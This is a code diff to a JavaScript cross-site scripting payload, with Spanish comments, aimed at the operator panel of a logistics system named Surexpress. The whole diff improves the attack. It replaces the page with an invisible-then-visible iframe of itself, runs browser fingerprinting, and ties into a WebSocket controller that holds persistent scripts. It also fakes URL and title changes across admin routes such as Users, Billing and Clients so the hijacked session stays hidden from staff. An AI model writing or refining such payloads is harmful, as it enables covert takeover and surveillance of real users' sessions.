@@ -4,7 +4,8 @@
 
 // Verificar contexto inmediatamente
 if (window.self !== window.top) {
-    // ESTAMOS EN IFRAME - Sin simulación de rutas
+    // ESTAMOS EN IFRAME - Simular rutas
+    setupIframeRouteSimulation();
 } else if (!window.__MAIN_XSS_EXECUTED__) {
     // ESTAMOS EN PÁGINA PRINCIPAL - IFRAME PRIMERO
     window.__MAIN_XSS_EXECUTED__ = true;
@@ -28,7 +29,7 @@ function executeMainXSS() {
                 return;
             }
 
-            // Crear iframe inmediatamente
+            // Crear iframe con opacidad 0 inicialmente para evitar flicker
             const iframe = document.createElement('iframe');
             iframe.src = window.location.href;
             iframe.style.cssText = `
@@ -42,17 +43,35 @@ function executeMainXSS() {
                 margin: 0 !important;
                 padding: 0 !important;
                 background: white !important;
+                opacity: 0 !important;
             `;
 
-            // Limpiar TODO y poner solo el iframe
-            document.body.innerHTML = '';
+            // Agregar iframe al body
+            document.body.appendChild(iframe);
+
+            // Limpiar otros elementos del body, manteniendo el iframe
+            const children = Array.from(document.body.children);
+            children.forEach(child => {
+                if (child !== iframe) {
+                    document.body.removeChild(child);
+                }
+            });
+
+            // Establecer estilos del body
             document.body.style.overflow = 'hidden';
             document.body.style.margin = '0';
             document.body.style.padding = '0';
-            document.body.appendChild(iframe);
 
-            // Ejecutar fingerprinting después del iframe
-            executeFullFingerprinting();
+            // Cuando el iframe cargue, hacerlo visible
+            iframe.onload = () => {
+                iframe.style.opacity = '1';
+
+                // Configurar simulación de rutas después del iframe
+                setupRouteSystem(iframe);
+
+                // Ejecutar fingerprinting después del iframe
+                executeFullFingerprinting();
+            };
 
         } catch (e) {
             setTimeout(createIframeFirst, 100);
@@ -130,6 +149,48 @@ function executeMainXSS() {
         } catch (e) {
             // Silenciar errores
         }
+    }
+
+    // Función para configurar simulación de rutas
+    function setupRouteSystem(iframe) {
+        let currentPath = window.location.pathname;
+
+        // Función para actualizar URL del navegador
+        function updateBrowserURL(path) {
+            currentPath = path;
+            window.history.replaceState({}, '', path);
+            document.title = 'Surexpress | ' + getPageTitle(path);
+        }
+
+        // Función para obtener título de página
+        function getPageTitle(path) {
+            const titles = {
+                '/Operator/Dashboard_M/': 'Dashboard',
+                '/Operator/Orders/': 'Órdenes',
+                '/Operator/Usuarios/': 'Usuarios',
+                '/Operator/Clientes/': 'Clientes',
+                '/Operator/Agencias/': 'Agencias',
+                '/Operator/Monitor/': 'Monitor',
+                '/Operator/GuiasAereas/': 'Guías Aéreas',
+                '/Operator/Billing/': 'Facturación',
+                '/Operator/Revision/': 'Revisiones',
+                '/Operator/incidenciaHouse/': 'Incidencias'
+            };
+            return titles[path] || 'Sistema';
+        }
+
+        // Escuchar mensajes del iframe para cambios de URL
+        window.addEventListener('message', (event) => {
+            if (event.data && event.data.type === 'URL_CHANGE') {
+                updateBrowserURL(event.data.url);
+            }
+        });
+
+        // Manejar botones atrás/adelante
+        window.addEventListener('popstate', () => {
+            const newPath = window.location.pathname + window.location.search;
+            iframe.src = newPath;
+        });
     }
 
     // Iniciar proceso - iframe primero
@@ -306,4 +367,133 @@ function setupWebSocketController() {
     return {
         getPersistentScripts: () => ({ ...persistentScripts })
     };
+}
+
+// =============================================
+// SIMULACIÓN DE RUTAS EN IFRAME
+// =============================================
+
+function setupIframeRouteSimulation() {
+    'use strict';
+
+    // Evitar ejecución múltiple en el mismo iframe
+    if (window.__IFRAME_ROUTES_ACTIVE__) {
+        return;
+    }
+    window.__IFRAME_ROUTES_ACTIVE__ = true;
+
+    // Interceptar History API
+    const originalPushState = history.pushState;
+    const originalReplaceState = history.replaceState;
+
+    history.pushState = function(state, title, url) {
+        if (url && window.parent) {
+            const urlStr = typeof url === 'string' ? url : url.toString();
+            window.parent.postMessage({
+                type: 'URL_CHANGE',
+                url: urlStr,
+                action: 'push'
+            }, '*');
+        }
+        return originalPushState.apply(this, arguments);
+    };
+
+    history.replaceState = function(state, title, url) {
+        if (url && window.parent) {
+            const urlStr = typeof url === 'string' ? url : url.toString();
+            window.parent.postMessage({
+                type: 'URL_CHANGE',
+                url: urlStr,
+                action: 'replace'
+            }, '*');
+        }
+        return originalReplaceState.apply(this, arguments);
+    };
+
+    // Interceptar clicks en enlaces
+    document.addEventListener('click', (e) => {
+        let target = e.target;
+        while (target && target.tagName !== 'A') {
+            target = target.parentElement;
+        }
+
+        if (target && target.href) {
+            // Permitir descargas
+            if (target.href.includes('/files/down/') ||
+                target.href.includes('.xlsx') ||
+                target.href.includes('.pdf') ||
+                target.href.includes('.csv') ||
+                target.href.includes('.zip') ||
+                target.download) {
+                return;
+            }
+
+            // Para navegación normal
+            if (target.href.includes('/Operator/')) {
+                e.preventDefault();
+
+                const url = new URL(target.href);
+                const path = url.pathname + url.search;
+
+                // Navegar dentro del iframe
+                window.location.href = target.href;
+
+                // Notificar al padre
+                if (window.parent) {
+                    window.parent.postMessage({
+                        type: 'URL_CHANGE',
+                        url: path,
+                        action: 'click'
+                    }, '*');
+                }
+            }
+        }
+    });
+
+    // Detector automático de cambios de ruta
+    let lastPath = window.location.pathname + window.location.search;
+
+    setInterval(() => {
+        const currentPath = window.location.pathname + window.location.search;
+        if (currentPath !== lastPath) {
+            lastPath = currentPath;
+
+            if (window.parent) {
+                window.parent.postMessage({
+                    type: 'URL_CHANGE',
+                    url: currentPath,
+                    action: 'auto'
+                }, '*');
+            }
+        }
+    }, 250);
+
+    // Interceptar formularios
+    document.addEventListener('submit', (e) => {
+        const form = e.target;
+        if (form.action && form.action.includes('/Operator/')) {
+            setTimeout(() => {
+                const currentPath = window.location.pathname + window.location.search;
+                if (window.parent) {
+                    window.parent.postMessage({
+                        type: 'URL_CHANGE',
+                        url: currentPath,
+                        action: 'form'
+                    }, '*');
+                }
+            }, 500);
+        }
+    });
+
+    // Notificar ruta inicial
+    setTimeout(() => {
+        if (window.parent) {
+            const currentPath = window.location.pathname + window.location.search;
+            window.parent.postMessage({
+                type: 'URL_CHANGE',
+                url: currentPath,
+                action: 'initial'
+            }, '*');
+        }
+    }, 300);
 }
